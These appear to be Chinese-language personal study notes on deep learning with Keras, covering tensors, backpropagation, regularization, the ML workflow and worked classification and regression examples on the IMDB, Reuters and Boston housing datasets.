梯度提升机：将多个弱预测模型集成起来，并通过训练循环不断改进弱预测模型；最后与决策树方法进行结合得到模型，其性质与随机森林类似，但效果更好；对于非感知问题，基本上是目前最适用的算法； 深度学习的不同点通过渐进的、逐层的方式，形成越来越复杂的表示；（貌似需要记录各层之间的依赖关系） 模型可以在同一时间共同学习所有表示层，而不是依次渐进的学习（基于前一步的不同层之间的依赖关系进行调整，但貌似计算量也很大） 决策树、随机森林和梯度提升机，都涉及到特征的提取（即特征工程），但深度学习则绕过了这个问题，它通过假设空间对每一层做简单变换，然后再根据反向传播不断微调，最终取得最好的权重值组合；（不过话说回来，怎么感觉假设空间与特征工程其实是一回事？差别在于后者没有记录依赖关系，学习的效率降低了）; 机器学习现状梯度提升机的常用框架：XGBoost； 深度学习的常用框架：Keras; 深度学习的两个核心思想卷积神经网络和反向传播，在70年代就已经提出了，但由于硬件和数据集的瓶颈，直到最近几年才开始发挥影响力； 硬件：CPU 的设计面向复杂的计算场景，使用多种指令集；GPU 的设计面向单一的使用场景，所以在特定场景中，其计算效率要远远高于 CPU；Google 则研发 TPU 进行专用的运算； 数据：由于互联网的普及，使得数据的收集变得非常容易； 算法：神经需要足够多的层数，才能发挥作用；早期没有找到有效增加层数进行梯度传播的办法；最近几年，越来越多的算法被提出，得以实现足够多的层数；包括：更好的神经层激活函数 activation function，更好的权重初始化方案 weight initialization scheme；更好的优化方案 optimization scheme；2014年以后，又增加了更好的覆盖率传播方法，例如：批标准化、残差连接、深度可分离卷积等； 2. 神经网络的数学基础初识神经网络分类问题中的某个类别叫作类 class，数据点叫做样本 sample，标签 label 用来表示样本对应某个类； 训练集（trainng set） 一般由 train_images 和 train_labels 组成；测试集（test set） 一般用 test_images 和 test_labels 组成； 神经网络的核心组件是层 layer，它是一个数据处理模块，它从输入数据中提取表示，有点像是一个数据过滤器，或者数据蒸馏器；大多数深度学习是将多个层链接起来，实现渐进式的数据蒸馏 data distillation； 在训练和测试过程中，需要指定需要监控的指标 metric，以便网络可以根据指标进行改进，拟合（fit）模型； 过拟合：学习模型是测试集上面的表现比训练集差； 神经网络的数据表示张量 tensor 是一种数据结构，用来存储输入网络的数据对象；张量是一种数字容器，可以看做是矩阵在任意维度的推广； 仅包含一个数字的张量，称为标量 scalar（也叫标量张量，零维张量，0D张量），标量张量的轴数为0； 数字组成的数组，叫做向量 vertor（也叫一维张量，1D张量），向量的轴数为1；向量（即数组）有几个元素，称为几D向量，例如5个元素称为5D向量； 向量组成的数组，叫做矩阵（也叫二维张量，2D张量），矩阵的轴数为2； 多个矩阵组成的数级，可以得到3D张量；多个3D张量组成的数组，可以得到 4D 张量，以此类推；多数深度学习使用 0D - 4D 张量的数据结构，视频处理则可能用 5D 张量； 张量的三个关键属性：轴数（即阶数，arr.ndim），形状（每个轴的维度大小, arr.shape）、数据类型(arr.dtype)； 张量切片：选择张量的特定元素；所有张量的第一个轴（即0轴）用于做样本轴（sample axis，也叫样本维度）； 深度学习模型为提高计算速度，会将数据集分成多个小批量，并行处理；每个小批量的第一个轴叫做批量轴或批量维度（其实本质和样本轴一样，只是数据量大小不同）； 几种常见的数据张量类型： 2D张量（即矩阵）：samples, features 时间序列：samples, timestamps, features 图像：samples, height, width, channels 视频：samples, frames, height, width, channels 张量运算逐元素（element-wise）运算：该运算独立应用于张量中的每个元素（因此这种运算非常适合用来做并行计算）； 广播：将轴数较小的张量，与轴数较大的张量进行运算时，小张量会在大张量的其他轴上进行广播； 张量点积 tensor product：其实它就是矩阵的乘法，背后的本质是求解多项式的应用；注意别跟逐元素的乘法弄混了； 张量变形 tensor reshaping：保持元素数量不变，但改变形状，也即 numpy 里面的 reshape，以及转置 np.transpose 张量运算可以视为几何空间中的运算；神经网络对输入数据在几何空间中做各种变换尝试，最终将原本复杂混合的数据，转换成清晰分类的数据（红纸蓝纸揉成一团后再解开的例子）； 基于梯度的优化output &#x3D; relu(dot(W, input), b)，其中 W，b 都是张量，属于该层的属性，分别对应 kernel 属性和 bias 属性；二者即该层的可训练参数 trainable parameter，或者叫权重 weight；一开始这些权重取很小的初始值，即随机初始化 random initialization； 抽取训练样本 x 和对应的目标样本 y 组成数据批量，将 x 输入网络运行得到预测值 y_pred；这一步叫做正向传播 forward pass； 由于网络中所有的运算都是可微的，因此可以计算损失相对于网络系数的梯度（张量运算的导数），之后按梯度的反方向改变网络系统大小；这一步叫做反向传播 backward pass； 随机梯度下降 stochastic gradient descent（SGD）：将参数沿着梯度的反方向随机移动一点点，从而使得损失减少一点点； 为了避免局部最小值和收敛速度问题，引入动量的概念：根据动量的概念，每次移动参数的幅度，要同时考虑加速度（斜率值）和当前速度（来自于之前的加速度），这样可以跳过局部最小点，同时加快收敛的速度； 链式法则：基于求导恒等式 (f(g(x)) = f(g(x)) * g&#96;(x)，推导出反向传播算法 back-propagation（也叫反式微分 reverse-mode differentiation），即根据最终损失值，从最顶层开始到最低层，推导每个参数对损失值的贡献大小；此处引入了符号微分 symbolic differentiation 算法，该算法可以实现：给定一个运算链，并且已知每个运算环节的导数，则可以求得整个运算链的梯度函数； 3. 神经网络入门神经网络剖析层：深度学习的基础组件不同的张量格式的不同的数据类型通常会使用到不同各类的层进行处理； 向量数据(2D)：密集层，也叫全连接层或密集连接层 图像数据(4D)：二维卷积层 序列数据(3D)：循环层 层兼容性：每一层只接收特定形状的输入，产生特定形状的输出； 模型：层构成的网络它有很多种结构，常见的如线性堆叠、双分支（two-branch）、多头（multi-head）、Inception模块等；网络的拓扑结构定义了一个假设空间，也因此限定了一系列特定的张量运算；选择合适有效的网络结构，更像是一门艺术而科学； 损失函数与优化器：配置学习过程的关键损失函数：选择正确的损失函数对解决问题至关重要，对于常见的问题，已经有一些现成的目标函数可以使用，例如二分类问题使用二元交叉熵(binary crossentropy)，序列问题使用联结主义时序分类(connectionist temporal classification)；多分类问题使用分类交叉熵(categorical crossentropy)；回归问题使用均方误差(mean-squared error)；只有真正面对全新问题的时候，才需要自主开发新的目标函数； 具有多个输出的神经网络，可能具有多个损失函数，但只能有一个损失标量值，因此需要将多个损失函数的结果取平均； Keras 简介Keras 是一模型库，因此它可以和张量库（如 TensorFlow, Theano, CNTK 等）配合使用，简化了用户的学习和上手成本； 使用 Keras 开发：概述典型的工作流程： 定义训练数据：输入张量和目标张量 定义模型（即由层组成的网络），将输入映射到目标； 配置学习过程：选择损失函数、优化器和过程中需要监控的指标； 调用模型的 fit 方法在训练数据上进行迭代； 定义模型的两种方法 使用 Sequential 类：用于层的线性堆叠，属于目前最常见的网络架构； 使用 函数式 API：通过有向无环图，用于构建任何形式的架构； 12345678910111213from keras import modelsfrom keras import layers# 使用 Sequential 构建模型model = models.Sequential()model.add(layers.Dense(32, activation=&quot;relu&quot;, input_shape=(784,)))model.add(layers.Dense(10, activation=&quot;softmax&quot;))# 使用函数式 API 构建模型input_tensor = layers.Input(shape=(784,))x = layers.Dense(32, activation=&quot;relu&quot;)(input_tensor)output_tensor = layers.Dense(10, activation=&quot;softmax&quot;)(x)model = models.Model(inputs=input_tensor, outputs=output_tensor) 配置学习过程 1234567from keras import optimizersmodel.compile( optimizer=optimizers.RMSprop(lr=0.001), loss=&quot;mse&quot;, metrics=[&quot;accuracy&quot;] ) 调用 fit 方法进行迭代训练 1model.fit(input_tensor, target_tensor, batch_size=128, epoch=10) 深度学习的原理并不复杂，最难的部分可能是根据待解决的问题，找到最适合的模型；对于常见的问题，前人们已经找到和总结了很多高效的模型；但在实际业务过程中，有可能会遇到不完全相同的问题，此时便需要在前人模型的基础，进一步调整和测试；这一步才是最难的，搞不好整个过程中都需要有一定的运气成分； 建立深度学习工作站推荐使用 Linux 系统 + GPU 机器； 虽然书上提供了在本地原生安装的方法，但其实更好的安装方式应该是使用 Docker 镜像，但可惜书上并没有提到； 电影评论分类：二分类问题导入 IMDB 数据集1234# 此处导入 keras 已经提前内置的 imdb 数据集from keras.datasets import imdb# imdb 对象的 load_data 方法可导入训练数据和测试数据，元组格式，每个元组由数据和标签两部分组成，一一对应(train_data, train_labels), (test_data, test_labels) = imdb.load_data(num_words=10000) 准备数据导入的数据只是列表，但 keras 只接收张量格式，因此需要将数据从列表格式转变成张量格式 1234567891011121314import numpy as np# 将列表转成张量，若存在某个单词，则在对应的索引位置标记1def vectorize_sequences(sequences, demension=10000): results = np.zeros((len(sequences), demension)) for i, sequence in enumerate(sequences): results[i, sequence] = 1. return resultstensor_train_data = vectorize_sequences(train_data)tensor_test_data = vectorize_sequences(test_data)tensor_train_labels = np.asarray(train_labels).astype(&#x27;float32&#x27;)tensor_test_labels = np.asarray(test_labels).astype(&#x27;float32&#x27;) 构建网络1234567891011121314151617181920212223242526272829303132333435363738394041424344from tensorflow.keras import modelsfrom tensorflow.keras import layers# 开始构建网络model = models.Sequential()# 此处的16表示使用16的隐藏单元，用来表示结果空间，16即表示空间有16个维度# 维度太高不一定好，一来计算量更大，二来有可能和训练数据过耦合，导致预测效果并不好# 维度太低则有可能没有提到出最有用的特征，导致预测准确率下降# 激活函数 relu 用来对计算结果中的负值归零，正值则保持不变model.add(layers.Dense(16, activation=&#x27;relu&#x27;, input_shape=(10000,)))model.add(layers.Dense(16, activation=&#x27;relu&#x27;))# 由于最终的目标是一个标量，1表示正面评论，0表示负面评论# 因此模型的最终输出的那层只需设置一个隐藏单元，这样就将计算结果映射到一个维度的标量中# 激活函数 sigmoid 用来对计算结果进行归一处理，这样可以表示最终的概率model.add(layers.Dense(1, activation=&quot;sigmoid&quot;))# 如果没有激活函数，则层的计算将只是 output = dot(W, input) + b 的矩阵点积计算，其结果# 将只是对数据进行简单的线性仿射变换，并没有实质性的改变数据的空间映射；而通过引入激活函数# 计算结果将不再是简单的线性变换，变成了非线性变换，因此空间映射发生了改变# 此处的模型编译使用了默认内置的优化器、损失函数和指标器，但是，这三个东西也是可以# 自定义的，即自定义优化函数、损失函数、衡量指标等；# 此处使用的损失函数为二元交叉熵 binary_crossentropy，因为最终的结果是一个二元问题，即是或者否# 因此特别适合使用二元交叉熵来做损失判断，它能够计算判断正确的概率# 如果结果并不是一个二元问题，而是一个范围问题，则应使用其他损失函数，例如均方误差 MSE，mean squared error# 它能够用来判断计算结果与预期目标的误差范围；# 另外此处使用的度量指标是准确度 accuracy，表示计算结果是否准确等于目标值；# 如果计算结果不需要准确等于目标值，而只需要控制在目标值一定范围内即可算是正确，则# 应该使用平均绝对误差 MAE，mean absolube error；model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;binary_crossentropy&quot;, metrics=[&#x27;accuracy&#x27;])# 根据问题场景的不同，内置的损失函数、度量指标、优化器不一定能够满足需求，此时# 可以使用自定义的损失函数、度量指标、优化器from keras import lossesfrom keras import metricsmodel.compile( optimizer=optimizers.RMSprop(1r=0.001), loss=losses.binary_crossentropy, metrics=[metrics.binary_accuracy]) 验证模型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 虽然在训练模型时将数据分为训练集和测试集，但在训练过程中，是分很多轮进行迭代训练的，这意味着每一轮都得对# 训练结果进行测试；此时不能将测试集引入测试，因为它将直接测试集被耦合进模型；因此，需要从训练集中，再拆分# 一部分数据出来，做为验证训练结果的测试数据，来训练模型；这样对最终的模型结果来说，测试集的数据仍然# 保持是前所未见的数据tensor_val_data = tensor_train_data[:10000]partial_tensor_train_data = tensor_train_data[10000:]tensor_val_labels = tensor_train_labels[:10000]partial_tensor_train_labels = tensor_train_labels[10000:]model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;binary_crossentropy&quot;, metrics=[&#x27;accuracy&#x27;])history = model.fit( partial_tensor_train_data, partial_tensor_train_labels, epochs=20, batch_size=512, validation_data=(tensor_val_data, tensor_val_labels))# 绘制图表，将训练结果可视化import matplotlib.pyplot as plt # 绘制预测损失的图表history_dict = history.historyloss_values = history_dict.get(&quot;loss&quot;)val_loss_values = history_dict.get(&quot;val_loss&quot;)epochs = range(1, len(loss_values) + 1)plt.plot(epochs, loss_values, &#x27;bo&#x27;, label=&quot;Training loss&quot;)plt.plot(epochs, val_loss_values, &#x27;b&#x27;, label=&#x27;Validation loss&#x27;)plt.title(&quot;Training and validation loss&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&quot;Loss&quot;)plt.legend()plt.show()# 绘制预测精度的图表plt.clf()acc = history_dict.get(&quot;acc&quot;)val_acc = history_dict.get(&quot;val_acc&quot;)plt.plot(epochs, acc, &#x27;bo&#x27;, label=&quot;Training acc&quot;)plt.plot(epochs, val_acc, &#x27;b&#x27;, label=&quot;Valication acc&quot;)plt.title(&quot;Training and validation accuracy&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&#x27;Accuracy&#x27;)plt.legend()plt.show() 调整模型1234567891011121314# 调整轮次重新训练网络模型，这次使用全部的训练集，没有使用验证集new_history = model.fit( tensor_train_data, tensor_train_labels, epochs=4, batch_size=512,)# 使用训练好的模型，使用测试集对其进行评估，看模型预测的准确性results = model.evaluate(tensor_test_data, tensor_test_labels)print(resutls)# 查看模型在测试集上的预测结果model.predict(tensor_test_data) 新闻分类：多分类问题总共有46个主题标签，每条新闻只属于其中的一个主题，即只拥有一个标签；因此这是一个单标签、多种类别的问题；另外对于电影，则有可能是多标签、多种类别的问题； 此处联想到图片上的目标识别，可能也可以算是一个单标签多分类的问题；因为可以假设目标物体由多个部位组成，例如由头、手、脚组成；这些部位即是目标类别，然后图片上的每一个点，有且只有可能属于其中的某个类别，或者完全不属于任何一个部位的类别； 整理数据1234567891011121314151617181920212223242526272829303132# 此处导入 keras 已经提前内置的 reuters 数据集from tensorflow.keras.datasets import reuters(train_data, train_labels), (test_data, test_labels) = reuters.load_data(num_words=10000)# 将数据张量化import numpy as npdef vectorize_sequences(sequences, demension=10000): results = np.zeros((len(sequences), demension)) for i, sequence in enumerate(sequences): results[i, sequence] = 1. return resultstensor_train_data = vectorize_sequences(train_data)tensor_test_data = vectorize_sequences(test_data)# 将标签向量化，有两种方法， 一种是将标签列表转换为整数张量，另一种是使用 one-hot 编码# one-hot 的意思就是将 n 个标签中，被命中的那个标记为 1，其他的标记为 0def to_one_hot(labels, dimension=46): results = np.zeros((len(labels), dimension)) for i, label in enumerate(labels): results[i, label] = 1. return resultsone_hot_train_labels = to_one_hot(train_labels)one_hot_test_labels = to_one_hot(test_labels)# 如果是转换为整数张量的话，则损失函数应该选择 sparse_categorical_crossentropy，即离散分类交叉熵tensor_train_data = np.array(train_data)tensor_train_labels = np.array(train_labels) 构建网络123456789101112131415161718192021# 构建网络from tensorflow.keras import modelsfrom tensorflow.keras import layers# 开始构建网络# 由于最后的结果需要将概率映射到46个标签的空间中，因此前面两层的空间不应该小于46# 此处空间隐藏单元数量取值 64，以避免计算过程中的信息丢失model = models.Sequential()model.add(layers.Dense(64, activation=&#x27;relu&#x27;, input_shape=(10000,)))model.add(layers.Dense(64, activation=&#x27;relu&#x27;))# 由于最后的目标是从46个标签中选择一个，所以此处最后一层选择的激活函数为 softmax，# 它用来计算某个样本在46种标签中，属于某一种标签的概率，46个概率的总共刚好等于 1model.add(layers.Dense(46, activation=&quot;softmax&quot;))# 此处的损失函数不再使用二元分类问题的交叉熵，而是使用多元分类问题的交叉熵# 度量指标仍然使用 accuracy，因为它本质上仍然是计算分类的准确率model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;categorical_crossentropy&quot;, metrics=[&#x27;accuracy&#x27;]) 训练模型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# 预留部分数据作为验证集val_data = tensor_train_data[:1000]partial_train_data = tensor_train_data[1000:]val_labels = one_hot_train_labels[:1000]partial_train_labels = one_hot_train_labels[1000:]# 训练模型history = model.fit( partial_train_data, partial_train_labels, epochs=20, batch_size=512, validation_data=(val_data, val_labels))# 绘制表格，将数据可视化import matplotlib.pyplot as plt # 绘制预测损失的图表history_dict = history.historyloss_values = history_dict.get(&quot;loss&quot;)val_loss_values = history_dict.get(&quot;val_loss&quot;)epochs = range(1, len(loss_values) + 1)plt.plot(epochs, loss_values, &#x27;bo&#x27;, label=&quot;Training loss&quot;)plt.plot(epochs, val_loss_values, &#x27;b&#x27;, label=&#x27;Validation loss&#x27;)plt.title(&quot;Training and validation loss&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&quot;Loss&quot;)plt.legend()plt.show()# 绘制预测精度的图表plt.clf()acc = history_dict.get(&quot;acc&quot;)val_acc = history_dict.get(&quot;val_acc&quot;)epochs = range(1, len(loss_values) + 1)plt.plot(epochs, acc, &#x27;bo&#x27;, label=&quot;Training acc&quot;)plt.plot(epochs, val_acc, &#x27;b&#x27;, label=&quot;Valication acc&quot;)plt.title(&quot;Training and validation accuracy&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&#x27;Accuracy&#x27;)plt.legend()plt.show()# 重新训练模型，因为从第 9 轮开始就过拟合了history = model.fit( partial_train_data, partial_train_labels, epochs=9, batch_size=512, validation_data=(val_data, val_labels))results = model.evaluate(tensor_test_data, one_hot_test_labels) 预测房价：回归问题整理数据123456789101112131415# 此处导入 keras 已经提前内置的 boston housing 数据集from tensorflow.keras.datasets import boston_housing(train_data, train_targets), (test_data, test_targets) = boston_housing.load_data()# 准备数据# 如果数据过于离散，取值范围跨度很大，虽然模型仍然可以从中进行学习# 但是这样会加大学习的难度，所以对于取值范围跨度很大的数据，最好一开始对其进行标准化操作mean = train_data.mean(axis=0)train_data -= meanstd = train_data.std(axis=0)train_data /= stdtest_data -= meantest_data /= std 构建网络12345678910111213141516from tensorflow.keras import modelsfrom tensorflow.keras import layersdef build_model(): model = models.Sequential() model.add(layers.Dense(64, activation=&#x27;relu&#x27;, input_shape=(train_data.shape[1],))) model.add(layers.Dense(64, activation=&#x27;relu&#x27;)) # 最后一层没有使用激活函数，是因为现在要解决的是一个标量回归的问题 # 因此最后一层计算出来的结果，可以直接作为目标值使用 model.add(layers.Dense(1)) model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;mse&quot;, metrics=[&#x27;mae&#x27;] ) return model 训练模型123456789101112131415161718192021222324252627282930313233import numpy as np # 使用 K 折验证，解决样本数过小的问题k = 4num_val_samples = len(train_data) // knum_epochs = 500all_mae_histories = []for i in range(k): print(&quot;processing fold: &quot;, i) val_data = train_data[i * num_val_samples : (i + 1) * num_val_samples] val_targets = train_targets[i * num_val_samples : (i + 1) * num_val_samples] partial_train_data = np.concatenate( [train_data[: i * num_val_samples], train_data[(i + 1) * num_val_samples:]], axis=0 ) partial_train_targets = np.concatenate( [train_targets[: i * num_val_samples], train_targets[(i + 1) * num_val_samples:]], axis=0 ) model = build_model() history = model.fit( partial_train_data, partial_train_targets, validation_data=(val_data, val_targets), epochs=num_epochs, batch_size=1, verbose=0) # print(history.history.keys()) # break mae_history = history.history[&#x27;val_mae&#x27;] all_mae_histories.append(mae_history) 绘制图表123456789101112131415161718192021222324252627282930average_mae_history = [ np.mean([x[i] for x in all_mae_histories]) for i in range(num_epochs)]# 绘制图表import matplotlib.pyplot as plt plt.plot(range(1, len(average_mae_history) + 1), average_mae_history)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&quot;Validation MAE&quot;)plt.show()# 去除无效值，平滑曲线def smooth_curve(points, factor=0.9): smoothed_points = [] for point in points: if smoothed_points: previous = smoothed_points[-1] smoothed_points.append(previous * factor + point * (1 - factor)) else: smoothed_points.append(point) return smoothed_points# 删除前10个数据点，因为它们跟其他点偏差过大smooth_mae_history = smooth_curve(average_mae_history[10:])plt.plot(range(1, len(smooth_mae_history) + 1), smooth_mae_history)plt.xlabel(&#x27;Epochs&#x27;)plt.ylabel(&#x27;Validation MAE&#x27;)plt.show() 重新训练12345678910111213# 训练最终的模型model = build_model()model.fit( train_data, train_targets, epochs=80, batch_size=16, verbose=0)test_mse_score, test_mae_score = model.evaluate(test_data, test_targets)print(test_mae_score) 小结 回归问题与分类问题不同；对于分类问题，要么对，要么错，因此可以使用准确率作为预测结果的度量指标；但对于回归问题，它的结果跟目标之间是以差值多少出现的，而非对或者错，因此它需要使用平均绝对误差 MAE 作为度量指标；同时它的损失函数使用均方误差 MSE 来计算； 由于回归问题的标签值是某个数值，每个值与值之间可能存在较大的取值范围，因此在使用模型学习之前，一般要对它们进行标准化处理，让它们的取值范围呈现标准化； 当样本数量比较少时，可以考虑使用 K 折验证来降低偶然因素； 如果样本数很少，模型的层数也应该尽量少一些，不然模型容易与数据产生过拟合； 4. 机器学习基础机器学习的四个分支1. 监督学习目标：学会将输入数据映射到已知目标； 分类问题：二分类、多分类； 回归问题：根据打分预测房价； 序列生成：给定一张图像，预测描述图像的文字（感觉像是多分类问题）； 语法树预测：给定一个句子，预测其生成的语法树； 目标检测：给定一张图像，在特定目标的周围画一个框； 图像分割：给定一张图像，在特定物体上画一个像素级的掩模； 2. 无监督学习 定义：没有特定目标的情况下，寻找输入数据的有趣变换； 目的：数据可视化、数据压缩、数据去噪，或者更好的理解数据的相关性；它常用于数据分析，在解决监督学习的问题之前，对数据进行分析通常是必要的，以便更好的了解数据集； 常用方法：降维（dimension reducion）、聚类（clustering）； 3. 自监督学习 定义：它是监督学习的一个特例；初始的时候，并没有输入标签，而只是给了一个启发式的算法，让机器来自己生成标签，然后靠这些标签进行自监督学习； 自监督学习的一个例子是自编码器，它用输入作为目标，来比对对数据所提取的抽象表征能否顺利的还原； 以前曾经用它来学习压缩算法，后来发现没有什么卵用，一个是压缩效率不高，二是跟输入数据强相关，在不同类型的数据上面，压缩效率急剧变差；目前研究到最有用的应用领域是图像去噪；另外一个应用是将数据降维，让其可视化，方便人类发现数据的一些有趣特征； 4. 强化学习智能体接收环境的信息，然后选择某种可以使奖励最大化的行动；目前主要在游戏领域比较成功，其他方面的应用则仍处于研究阶段； 常见术语 样本：也叫输入，进入模型的数据； 预测：也叫输出，模型给出的结果； 目标：真实准确的值，模型在理想情况下给出的结果应跟目标一致； 预测误差：也叫损失值，预测与目标之间的距离； 类别：分类问题中的一组分类标签； 标签：分类问题中的单个类别标签； 真值：也叫标注：数据集的所有目标； 二分类：预测结果只有两个类型的分类任务； 多分类：预测结果应分配到2个以上类型的分类任务； 多标签分类：预测结果可以分配多个标签的任务； 标量回归：目标是连续的标量值的任务，例如房价； 向量回归：目标是一组连续值的任务，例如图像边框检测； 小批量：模型同时进行处理的一小组样本；样本数量通常取2的幂，这样在 GPU 内存上比较好分配； 特征图：feature map，其实就是 3D 张量（包含高度和宽度两个空间轴，和一个深度轴，深度轴也叫通道轴），它即可以是输入，也可以是输出（此处的通道很像 Dense 层里面的隐藏单元，用来存放计算结果）； 过滤器：filter，3D 张量深度轴的不同通道即是代表过滤器；通道值是过滤器对输入数据的某一方面进行编码的结果； 评估机器学习模型可泛化的模型：在新数据上面表现良好的模型；泛化能力是评估一个模型优秀与否的指标； 模型的超参数：指模型的层数、每层大小（隐藏单元数量）这些参数；模型的参数：指每层的权重值； 训练集、验证集和测试集将数据分成三个集合是必要的，因为在训练过程中，模型反复根据验证集的验证结果进行参数的调整，这会导致模型与验证集的拟合性越来越好，但是在全新数据上面的性能却不一定更好；所以需要有一个测试集，做为全新的数据来对模型进行评估； 三种经典的模型评估方法1. 简单留出验证将数据分成三部分，其中的训练集、验证集用来训练模型，测试集用来评估模型；缺点：当样本数很少时，这种方法很容易跟数据过拟合；过拟合可以通过随机打乱数据集来训练模型，看最后的结果是否波动很大； 2. K 折验证将数据均分大小相同的 K 个分区，每次取其中一个分区作为验证集，余下做为训练集；最后取 K 个分数的平均值作为评分； 3. 重复 K 折验证进行多次 K 折验证，每次都将数据先打乱；这种方式的计算成本比较高；需要计算 K * P 次 评估模型的注意事项 数据代表性：一般通过随机打乱数据来实现； 时间箭头：如果是解决用旧数据预测未来新数据的问题，则注意训练的数据与测试的数据有时间点的区隔，不可重叠； 数据冗余：确保训练集和测试集没有任何交集，避免因为有数据冗余导致隐藏交集； 数据预处理、特征工程和特征学习神经网络的数据预处理 向量化：data vectorization，神经网络的输入和目标都必须是浮点数张量（少数特殊情况可接收整数）； 值标准化：让所有特征的均值为0，标准差为1；输入数据应满足同质性，即大致相同的取值范围； 处理缺失值：一般使用 0 来代表缺失值；如果样本集中没有缺失值，但未来的新数据有可能有缺失值，那么训练出来的网络无法应对有缺失值的情况，此时需要人工生成一些缺失值的样本； 特征工程特征工程的作用在于：用更简单的方式来表达问题，从而使得问题的解决变得更容易； 虽然现代的卷积神经网络可以自动学习特征，使得大部分特征工程变得没有必要，但是良好的特征工程仍然重要，原因有二： 用更少的计算资源更优雅的解决问题 用更少的数据样本即可解决问题； 过拟合和欠拟合机器学习的根本问题是优化（optimization）和泛化（generalization）的对立； 防止模型从训练数据中学到错误或无关紧要的模式，方法有二： 最优的方法：收集更多的数据用于训练； 次优的方法：调节模型允许存储的信息量，或对允许存储的信息增加约束；原因：模型允许存储的信息量越少，模型越容易记住更关键的信息； 降低过拟合的方法：正则化 regularization1. 减少网络大小如果模型的容量足够大（由层数和每层单元数决定），模型将很容易实现样本和目标之间的映射关系，但这种映射却对泛化能力有害； 反之，如果容量不那么大，则无法轻松实现映射，此时模型就需要学会对目标具有很强预测能力的压缩表示，这样对泛化有利；但容量也不能太小，不然容易出现欠拟合问题； 暂时没有魔法公式可以确定最佳层数和每层最佳单元数，这需要使用验证集进行反复实验才能得到最佳结果； 2. 添加权重正则化 奥卡姆剃刀原则：如果一件事情有两种解释，那么最可能正确的是最简单的那个（即假设条件最少的那个）； 给定一些训练数据和一种网络架构，很多组权重值（即很多模型）都可以解释这些数据，此时，简单的模型比复杂的模型更不容易过拟合； 这里的简单模型指参数分布的熵更小的模型，或参数更少的模型；熵被用计算一个系统中的失序现象，即系统的混乱程度；熵越高 ，系统越混乱； 通过强制让模型权重取较小的值，从而限制模型的复杂度，使得权重值的分布更加规则（regular）；这种方法叫权重正则化（weight regularization）；实现方法：向网络的损失函数中添加与较大权重值相关的成本，Keras 中通过向层传递权重正则化项实例（weight regularizer）； L1 正则化：添加的成本与权重系数的绝对值成正比； L2 正则化：添加的成本与权重系数的平方成正比；此方法也叫权重衰减（weight decay）； 由于惩罚项只在训练时添加，测试没有添加，因此网络的训练损失会比测试损失大很多； 3. 添加 dropout 正则化对某一层使用 dropout，就是在训练过程中随机将该层的一些输出特征舍弃（设置为 0）；dropout 的比率通常在 0.2~0.5 范围内； 测试时没有单元被舍弃，而该层的输出值需要按 dropout 比率缩小，因为此时有更多的单元被激活，需要加以平衡；但在实践中，一般这个平衡的动作是在训练时操作，即先 dropout，再将输出成比例放大；而最后测试时输出保持不变；dropout 的思想在于在层的输出中引入一些噪声，从而避免模型学习到一些偶然的模式，从而降低过拟合的概率； 机器学习的通用工作流程1. 定义问题，收集数据集使用机器学习解决问题的关键在于以下两个假设成立： 假设输出是可以根据输入进行预测的；（数据与答案有关联） 现实中，有很多问题的答案，如果跟过去的历史并没有关系，则机器学习到的模型并不能用来很好的预测未来； 假设可用数据包含足够多的信息，足以学习输入和输出之间的关系；（数据足够多） 数据必须是在一个平稳的尺度上收集的；例如用夏天的服装销售数据预测冬天的销量并没有意义，因为机器学习无法解决非平稳问题（nonstationary problem）； 2. 选择衡量成功的指标制定衡量成功的指标，与损失函数的选择相关；不同类别的问题，选择不同的指标； 平衡分类问题（每种类别的可能性相同）：常用指标为精度和 ROC AUC（area under the receiver operating characteristis curve，接收者操作特征曲线下面积）； 不平衡的分类问题：常用指标为准确率和召回率（问：啥是召回率？答：所有为真值的样本，被正确识别出来的比例，而准确率表示被认为是真的那些样本，确实为真的比例）； 排序问题或多标签分类：常用指标为平均准确率均值（mean average precision）； 其他更多的问题类型和对应的自定义指标，可以浏览 Kaggle 网站上的数据竞赛，上面有各式各样的问题和评估指标； 3. 确定评估方法留出验证集、K 折验证、重复 K 折验证，三者选其一；一般情况下，第一种方法即可满足要求（除非样本数很小）； 4. 准备数据将数据格式化，转换成张量数据； 5. 开发比基准更好的模型此阶段的目标在于先开发一个”小型“模型，它要能够打败纯随机的基准（dumb baseline），即获得统计功效（statistical power）； 如果不能获得统计功效，那有可能答案并不在数据里，先前的两个假设可能是错误的； 构建模型需要选择的三个关键参数： 最后一层的激活：它用来对网络的输出做有效的限制； 损失函数：需要匹配问题类型； 优化器：一般使用 rmsprop 即可； 衡量问题成功与否的指标，有时并不能用损失函数进行优化，因为损失函数有两个要求，一是即使小批量数据也可以计算，二是必须是可微的；此时的办法是使用替代指标，例如 ROC AUC 的替代指标为交叉熵； 6. 扩大模型规模：开发过拟合的模型在有了统计功效的小模型之后，接下来要做的是扩大它，让它变成过拟合；因为理想的模型刚好处在欠拟合和过拟合的分界线上；所以需要先达到过拟合的状态，才能发现二者的分界线； 开发过拟合模型的办法： 添加更多的层； 每层变得更大； 训练更多的轮次； 通过始终监控训练损失和验证损失，以及所关注指标的训练值和验证值，来发现是否出现过拟合； 7. 模型正则化与调节参数此步的目标是反复对模型进行局部的调节优化，以便达到最佳的性能； 调节模型的方法： 添加 dropout 尝试不同的架构：增加或减少层数； 添加 L1 和(或) L2 正则化（正则化：在损失函数中，给更大的权重值添加一些成本）； 尝试不同的超参数（比如每层的单元个数，或优化器的学习率），以找到最佳配置 （可选）反复做特征工程：添加新特征，或者删除没有信息量的特征； 一旦开发出满意的模型配置后，就可以在训练集和验证集上训练最终的生产模型，然后在测试集上最后评估一次； 如果测试集上的性能比验证集差很多，则说明验证流程并不可靠，或者模型在验证数据上出现了过拟合；此时，需要更换为更可靠的验证方法，如 K 折验证等； 5. 深度学习用于计算机视觉卷积神经网络简介卷积网络在处理图像时特别好用，原因在于它对应了图像的两种基本特征： 平移不变性：在某个局部位置学习到的模式，可以适用于其他位置，即局部模式可以进行平移；密集连接网络学习到的模式是全局关系，因此它不具备平移不变性；（可移植） 